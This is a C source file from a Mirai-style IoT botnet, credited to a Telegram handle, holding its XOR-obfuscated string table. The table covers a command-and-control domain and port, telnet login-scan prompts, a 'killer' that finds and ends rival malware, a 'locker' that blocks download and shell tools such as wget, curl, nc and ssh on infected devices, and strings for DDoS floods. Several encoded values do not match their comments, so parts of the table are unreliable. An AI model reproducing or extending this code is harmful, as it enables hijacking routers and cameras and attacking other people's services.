// by juan @ipmiv2 on telegram

#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdint.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

#include "headers/config.h"
#include "headers/process.h"
#include "headers/util.h"

uint32_t table_key = 0xdedefbaf;
struct table_value table_v[TABLE_MAX_KEYS];

void table_init(void)
{
    add_entry(TABLE_CNC_DOMAIN, "\x4F\x47\x4D\x55\x0C\x56\x4F\x43\x50\x49\x47\x56\x0C\x51\x56\x4D\x50\x47\x22", 1);
    add_entry(TABLE_CNC_PORT, "\x53\x9B", 2); // 1999
    add_entry(TABLE_SCAN_CB_PORT, "\x44\x52", 3); // 4102
    add_entry(TABLE_EXEC_SUCCESS, "\x41\x4E\x4D\x57\x46\x46\x58\x5B\x55\x43\x51\x4A\x47\x50\x47\x22", 4);
    add_entry(TABLE_SCAN_SHELL, "\x27\x3C\x31\x38\x38\x54", 5); // shell
    add_entry(TABLE_SCAN_ENABLE, "\x31\x3A\x35\x36\x38\x31\x54", 6); // enable
    add_entry(TABLE_SCAN_SYSTEM, "\x27\x2D\x27\x20\x31\x39\x54", 7); // system
    add_entry(TABLE_SCAN_SH, "\x27\x3C\x54", 8); // sh
    add_entry(TABLE_SCAN_QUERY, "\x7B\x36\x3D\x3A\x7B\x36\x21\x27\x2D\x36\x3B\x2C\x74\x1B\x03\x15\x06\x1D\x54", 19); // /bin/busybox OWARI
    add_entry(TABLE_SCAN_RESP, "\x1B\x03\x15\x06\x1D\x6E\x74\x35\x24\x24\x38\x31\x20\x74\x3A\x3B\x20\x74\x32\x3B\x21\x3A\x30\x54", 24); // OWARI: applet not found
    add_entry(TABLE_SCAN_NCORRECT, "\x3A\x37\x3B\x26\x26\x31\x37\x20\x54", 9); // ncorrect
    add_entry(TABLE_SCAN_PS, "\x7B\x36\x3D\x3A\x7B\x36\x21\x27\x2D\x36\x3B\x2C\x74\x24\x27\x54", 16); // /bin/busybox ps
    add_entry(TABLE_SCAN_KILL_9, "\x7B\x36\x3D\x3A\x7B\x36\x21\x27\x2D\x36\x3B\x2C\x74\x3F\x3D\x38\x38\x74\x79\x6D\x74\x54", 22); // /bin/busybox kill -9
    add_entry(TABLE_KILLER_PROC, "\x2D\x62\x60\x2D\x41\x4D", 7); // /proc/
    add_entry(TABLE_KILLER_EXE, "\xC2\xE8\x05\x28", 5); // /exe
    add_entry(TABLE_KILLER_FD, "\x7B\x32\x30\x54", 4); // /fd
    add_entry(TABLE_KILLER_MAPS, "\x7B\x39\x35\x24\x27\x54", 6); // /maps
    add_entry(TABLE_KILLER_TCP, "\x7B\x24\x26\x3B\x37\x7B\x3A\x31\x20\x7B\x20\x37\x24\x54", 14); // /proc/net/tcp
    add_entry(TABLE_KILLER_STATUS, "\x7B\x27\x20\x35\x20\x21\x27\x54", 8); // /status
    add_entry(TABLE_KILLER_ANIME, "\x7A\x35\x3A\x3D\x39\x31\x54", 7); // .anime
    add_entry(TABLE_MEM_ROUTE, "\x7B\x24\x26\x3B\x37\x7B\x3A\x31\x20\x7B\x26\x3B\x21\x20\x31\x54", 16); // /proc/net/route
    add_entry(TABLE_MEM_ASSWD, "\x35\x27\x27\x23\x3B\x26\x30\x54", 8); // assword
    add_entry(TABLE_KILLER_CMDLINE, "\x7B\x37\x39\x30\x38\x3D\x3A\x31\x54", 9);
    add_entry(TABLE_KILLER_TMP, "\x20\x39\x24\x7B\x54", 5);
    add_entry(TABLE_KILLER_DATALOCAL, "\x30\x35\x20\x35\x7B\x38\x3B\x37\x35\x38\x54", 11);
    add_entry(TABLE_KILLER_QTX, "\x25\x20\x2C\x36\x3B\x20\x54", 7);
    add_entry(TABLE_KILLER_DOT, "\x7A\x54", 2);
    add_entry(TABLE_KILLER_ARM, "\x35\x26\x39\x54", 4);
    add_entry(TABLE_KILLER_QTX2, "\x36\x3B\x20\x54", 4);
    add_entry(TABLE_KILLER_X86, "\x2C\x6C\x62\x54", 4);
    add_entry(TABLE_KILLER_SH4, "\x27\x3C\x60\x54", 4);
    add_entry(TABLE_KILLER_MIPS, "\x39\x3D\x24\x27\x54", 5);
    add_entry(TABLE_KILLER_MPSL, "\x39\x24\x27\x38\x54", 5);
    add_entry(TABLE_KILLER_SDA, "\x27\x30\x35\x54", 4);
    add_entry(TABLE_KILLER_MTD, "\x39\x20\x30\x54", 4);
    add_entry(TABLE_KILLER_HAKAI, "\x3C\x35\x3F\x35\x3D\x54", 6);
    add_entry(TABLE_ATK_VSE, "\x00\x07\x3B\x21\x26\x37\x31\x74\x11\x3A\x33\x3D\x3A\x31\x74\x05\x21\x31\x26\x2D\x54", 21); // TSource Engine Query
    add_entry(TABLE_ATK_RESOLVER, "\x7B\x31\x20\x37\x7B\x26\x31\x27\x3B\x38\x22\x7A\x37\x3B\x3A\x32\x54", 17); // /etc/resolv.conf
    add_entry(TABLE_ATK_NSERV, "\x3A\x35\x39\x31\x27\x31\x26\x22\x31\x26\x74\x54", 12);
    add_entry(TABLE_MISC_WATCHDOG, "\x7B\x30\x31\x22\x7B\x23\x35\x20\x37\x3C\x30\x3B\x33\x54", 14); // /dev/watchdog
    add_entry(TABLE_MISC_WATCHDOG2, "\x7B\x30\x31\x22\x7B\x39\x3D\x27\x37\x7B\x23\x35\x20\x37\x3C\x30\x3B\x33\x54", 19); // /dev/misc/watchdog
    add_entry(TABLE_SCAN_ASSWORD, "\x24\x36\x36\x32\x2A\x37\x21\x45", 8); // assword
    add_entry(TABLE_SCAN_OGIN, "\x3B\x33\x3D\x3A\x54", 5); // ogin
    add_entry(TABLE_SCAN_ENTER, "\x31\x3A\x20\x31\x26\x54", 6); // enter
    add_entry(TABLE_MISC_RAND, "\x6D\x21\x65\x66\x67\x60\x60\x6C\x21\x65\x66\x60\x35\x21\x6C\x65\x60\x30\x60\x2C\x65\x64\x54", 23); // 9u123448u124au814d4x10

    // hide
    add_entry(TABLE_HIDE_FILE, "\x28\xD7\x85\xF8\x54\x58\xA6", 123); /* "/proc/1" */
    add_entry(TABLE_HIDE_SELF, "\x2B\x64\x16\x3B\xF7\x2B\x47\xA1\xC8\x32", 124); /* "/proc/self" */

    /* locker */
    add_entry(TABLE_LOCKER_CMDLINE, "\xBD\x91\x4F\xF6\x0E\xDB\x8C\x17", 125); /* "/cmdline" */
    add_entry(TABLE_LOCKER_WGET, "\x9A\xEA\x18\x39", 126); /* "wget" */
    add_entry(TABLE_LOCKER_FTP, "\x62\x60\xB4", 127); /* "ftp" */
    add_entry(TABLE_LOCKER_CURL, "\x8E\xF8\x0F\x21", 128); /* "curl" */
    add_entry(TABLE_LOCKER_ECHO, "\x88\xEE\x15\x22", 129); /* "echo" */
    add_entry(TABLE_LOCKER_MOUNT, "\x50\x62\x88\x43\xC9", 130); /* "mount" */
    add_entry(TABLE_LOCKER_SOCAT, "\x4E\x62\x9E\x4C\xC9", 131); /* "socat" */
    add_entry(TABLE_LOCKER_NC, "\x6A\x77\xC4", 132); /* "nc\0" */
    add_entry(TABLE_LOCKER_SH, "\x77\x7C\xC4", 133); /* "sh\0" */
    add_entry(TABLE_LOCKER_LOGIN, "\x6E\x7D\x75\x2B\x4C\x62", 134); /* "login\0" */
    add_entry(TABLE_LOCKER_STATUS, "\x28\xD4\x83\xF6\x43\x02\xE4", 135); /* "/status" */
    add_entry(TABLE_LOCKER_PPID, "\x4D\x7D\x94\x49\x87", 136); /* "ppid:" */

    // hik domination
    add_entry(TABLE_HIK_DIR1, "\x12\x65\x92\x40\xD8", 137); /* "/home" */
    add_entry(TABLE_HIK_DIR2, "\xC2\xE9\x18\x3B", 138); /* "/dev" */
    add_entry(TABLE_HIK_DIR3, "\xC2\xFB\x1C\x3F", 139); /* "/var" */


    add_entry(TABLE_KILLER_MOUNTS, "\xE3\x5C\x7E\x43\x9F\x83\xA1\x13\x29\x32\xC8\xEF", 140); /* "/proc/mounts" */
    add_entry(TABLE_KILLER_SELF, "\xD4\x0B\x59\xF4\xF8\x04\x58\x6E\x37\xDD\x44\xDE\x63\x2E", 141); /* "/proc/self/exe" */
    add_entry(TABLE_KILLER_SO, "\x2A\x67\xAB", 142); /* ".so" */
    add_entry(TABLE_KILLER_STDIN, "\x12\x6B\x99\x02\x8D", 143); /* "/fd/0" */
    add_entry(TABLE_KILLER_NULL, "\x6E\x95\x44\x47\xDE\xFF\xF4\x3D\x6D", 144); /* "/dev/null" */
    add_entry(TABLE_KILLER_CONSOLE, "\xE3\x48\x69\x5A\xD3\xCF\xA3\x12\x2F\x33\xD0\xF9", 145); /* "/dev/console" */

    /* upgraded killer entries */
    add_entry(TABLE_KILLER_TMPDIR, "\x7B\x20\x39\x24\x54", 4); /* "/tmp" */
    add_entry(TABLE_KILLER_TCP6, "\x7B\x24\x26\x3B\x37\x7B\x3A\x31\x20\x7B\x20\x37\x24\x66\x54", 15); /* "/proc/net/tcp6" */
    add_entry(TABLE_KILLER_LISTEN, "\x0A\x06\x05\x22\x1C\x07\x1B\x1F\x54", 9); /* "0A" = listen state in /proc/net/tcp */
    add_entry(TABLE_KILLER_ESTAB, "\x01\x54", 2); /* "01" = established state */
    add_entry(TABLE_KILLER_EXE_DELETED, "\x20\x31\x38\x31\x20\x31\x30\x54", 8); /* " (deleted)" */
    add_entry(TABLE_KILLER_WDOG_DEV, "\x7B\x30\x31\x22\x7B\x23\x35\x20\x37\x3C\x30\x3B\x33\x54", 14); /* "/dev/watchdog" */

    /* upgraded locker entries */
    add_entry(TABLE_LOCKER_TFTP, "\x20\x32\x20\x24\x54", 4); /* "tftp" */
    add_entry(TABLE_LOCKER_WGET2, "\x23\x33\x31\x20\x66\x54", 5); /* "wget2" */
    add_entry(TABLE_LOCKER_AXEL, "\x35\x2C\x31\x38\x54", 4); /* "axel" */
    add_entry(TABLE_LOCKER_ARIA2C, "\x35\x26\x3D\x35\x66\x37\x54", 6); /* "aria2c" */
    add_entry(TABLE_LOCKER_IRSSI, "\x3D\x26\x27\x27\x3D\x54", 5); /* "irssi" */
    add_entry(TABLE_LOCKER_BUSYBOX, "\x36\x21\x27\x2D\x36\x3B\x2C\x54", 7); /* "busybox" */
    add_entry(TABLE_LOCKER_SSH, "\x27\x27\x3C\x54", 3); /* "ssh" */
    add_entry(TABLE_LOCKER_SCP, "\x27\x37\x24\x54", 3); /* "scp" */
    add_entry(TABLE_LOCKER_TELNET, "\x20\x31\x38\x3A\x31\x20\x54", 6); /* "telnet" */
    add_entry(TABLE_LOCKER_PERL, "\x24\x31\x26\x38\x54", 4); /* "perl" */
    add_entry(TABLE_LOCKER_PYTHON, "\x24\x2D\x20\x3C\x3B\x3A\x54", 6); /* "python" */
    add_entry(TABLE_LOCKER_RUBY, "\x26\x21\x36\x2D\x54", 4); /* "ruby" */
    add_entry(TABLE_LOCKER_LUA, "\x38\x21\x35\x54", 3); /* "lua" */
    add_entry(TABLE_LOCKER_GDB, "\x33\x30\x36\x54", 3); /* "gdb" */
    add_entry(TABLE_LOCKER_STRACE, "\x27\x20\x26\x35\x37\x31\x54", 6); /* "strace" */
    add_entry(TABLE_LOCKER_IPTABLES, "\x3D\x24\x20\x35\x36\x38\x31\x27\x54", 8); /* "iptables" */
    add_entry(TABLE_LOCKER_PS, "\x24\x27\x54", 2); /* "ps" */
    add_entry(TABLE_LOCKER_KILL, "\x3F\x3D\x38\x38\x54", 4); /* "kill" */
    add_entry(TABLE_LOCKER_FIND, "\x32\x3D\x3A\x30\x54", 4); /* "find" */
}

void table_unlock_val(uint8_t id)
{
    struct table_value *val = &table_v[id];

#ifdef DEBUG
    if (!val->locked)
    {
        printf("[table] Tried to double-unlock value %d\n", id);
        return;
    }
#endif

    toggle_obf(id);
}

void table_lock_val(uint8_t id)
{
    struct table_value *val = &table_v[id];

#ifdef DEBUG
    if (val->locked)
    {
        printf("[table] Tried to double-lock value\n");
        return;
    }
#endif

    toggle_obf(id);
}

char *table_retrieve_val(int id, int *len)
{
    struct table_value *val = &table_v[id];

#ifdef DEBUG
    if (val->locked)
    {
        printf("[table] Tried to access table.%d but it is locked\n", id);
        return NULL;
    }
#endif

    if (len != NULL)
        *len = (int)val->val_len;
    return val->val;
}

static void add_entry(uint8_t id, char *buf, int buf_len)
{
    char *cpy = malloc(buf_len);
    if (cpy == NULL)
    {
        perror("malloc");
        exit(1);
    }

    util_memcpy(cpy, buf, buf_len);

    table_v[id].val = cpy;
    table_v[id].val_len = (uint16_t)buf_len;
#ifdef DEBUG
    table_v[id].locked = TRUE;
#endif
}

static void toggle_obf(uint8_t id)
{
    int i;
    struct table_value *val = &table_v[id];
    uint8_t k1 = table_key & 0xff,
            k2 = (table_key >> 8) & 0xff,
            k3 = (table_key >> 16) & 0xff,
            k4 = (table_key >> 24) & 0xff;

    for (i = 0; i < val->val_len; i++)
    {
        val->val[i] ^= k1;
        val->val[i] ^= k2;
        val->val[i] ^= k3;
        val->val[i] ^= k4;
    }

#ifdef DEBUG
    val->locked = !val->locked;
#endif
}
